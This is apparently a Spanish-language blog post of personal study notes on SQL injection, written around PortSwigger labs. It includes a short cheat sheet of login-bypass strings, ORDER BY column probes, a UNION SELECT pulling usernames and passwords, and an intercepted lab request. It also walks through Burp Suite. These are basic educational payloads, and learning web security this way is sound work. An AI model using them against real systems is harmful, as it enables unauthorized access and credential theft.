---
layout: post
title: "SQL Injection: Apuntes y Recursos"
date: 2025-12-26
categories: [Ciberseguridad, Hacking]
tags: [sql, pentesting, web, portswigger]
Author: "Jaki"
image: /assets/img/Gemini_Generated_Image_hqit0ihqit0ihqit.png

---

# 🛡️ Inicio

En este post documento mis apuntes y recursos sobre **SQL Injection**, una de las vulnerabilidades web más críticas que permite a un atacante interferir con las consultas que una aplicación hace a su base de datos.

## 🧐 ¿Qué es SQL Injection?

Es una vulnerabilidad donde el atacante logra "inyectar" código SQL malicioso en un campo de entrada (como un buscador o un login). Si la aplicación no tiene una **validación** correcta, el motor de la base de datos ejecutará ese código como si fuera una orden legítima.


---

## 📚 Conceptos Fundamentales

Para entender SQLi, primero debemos dominar estos tres pilares:

1. **Bases de Datos Relacionales:** Organizan la información en tablas conectadas por llaves. SQLi busca romper esa estructura para extraer datos prohibidos.
2. **Sesiones:** A menudo usamos SQLi para saltar el login (**Bypass**) y obtener una sesión activa de administrador sin conocer la contraseña.
3. **Validación de Entradas:** La falta de filtros es lo que permite el ataque. Un sistema seguro "sanitiza" lo que el usuario escribe.

---

## 🚀 Payloads Comunes (Cheat Sheet)

Aquí dejo algunos de los payloads que he practicado en laboratorios:

### 1. Bypass de Login
Permite entrar a una cuenta sin contraseña.

```sql
' OR 1=1 --
' OR '1'='1' --
" OR 1=1 --
```

### 2. Detección de Columnas (UNION Based)
Para saber cuántas columnas tiene la tabla actual.

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

### 3. Extracción de Datos
Una vez sabemos el número de columnas, extraemos información sensible.

```sql
' UNION SELECT NULL, username, password FROM users--
```

## 🛠️ Intercepción con Burp Suite

Para ataques de SQL Injection más avanzados, no basta con el navegador. Necesitamos una herramienta de tipo **Interception Proxy** como **Burp Suite**.

### ¿Cómo funciona el proceso?

1. **Configuración del Proxy:** Configuramos nuestro navegador para que todo el tráfico pase a través de Burp Suite (usualmente en el puerto `127.0.0.1:8080`).
2. **Intercept ON:** Activamos la pestaña *Proxy > Intercept*. Al realizar una acción en la web (como darle click a un filtro de categoría), la petición se detendrá en Burp.
3. **Modificación del Payload:** Aquí es donde ocurre la magia. En lugar de pelear con el formato de la URL en el navegador, modificamos los parámetros directamente en la petición HTTP cruda.
4. **Uso del Repeater:** Si un payload no funciona a la primera, enviamos la petición al *Repeater* (Ctrl + R). Esto nos permite modificar el SQL y reenviarlo una y otra vez sin tener que recargar la página manualmente.

### Ejemplo de petición interceptada:

```http
GET /filter?category=Gifts' +OR+1=1-- HTTP/1.1
Host: ace11f211fef.web-security-academy.net
Cookie: session=xyz123...
```

**En este ejemplo, interceptamos el parámetro category y añadimos nuestro payload de bypass.**

## 🛠️ Recursos y Referencias

Estos son los sitios que utilizo para practicar y profundizar en mis investigaciones:

* [📺 **Mi video de Youtube sobre SQL Injection**](https://www.youtube.com/watch?v=ffgYhkk8CCw) - Explicación paso a paso.
* [🎯 **PortSwigger Academy**](https://portswigger.net/web-security) - Laboratorios gratuitos de alta calidad.
* [📂 **PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) - Repositorio con miles de payloads listos para usar.
* [🛡️ **OWASP SQL Injection Guide**](https://owasp.org/www-community/attacks/SQL_Injection) - La guía técnica oficial para entender y prevenir este ataque.

---

⚠️ **Aviso de Ética:** Estos apuntes tienen fines exclusivamente educativos y de seguridad defensiva. Nunca utilices estas técnicas en sistemas sin autorización previa.

**Post creado por Jaki para la comunidad quaker :v**
